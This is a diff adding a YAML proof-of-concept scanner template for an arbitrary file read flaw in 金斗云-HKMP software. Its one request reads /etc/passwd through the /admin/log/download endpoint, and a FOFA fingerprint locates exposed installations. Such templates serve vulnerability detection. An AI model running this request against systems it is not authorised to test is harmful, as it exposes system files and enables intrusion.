@@ -1,0 +1,15 @@
+id: poc-yaml-kingtowin-download-anyfile-read
+info:
+  name: 金斗云-HKMP智慧商业软件 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金斗云-HKMP
+  fofa: body="金斗云 HKMP"
+requests:
+- method: GET
+  path: /admin/log/download?file=/etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"fileName=passwd\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
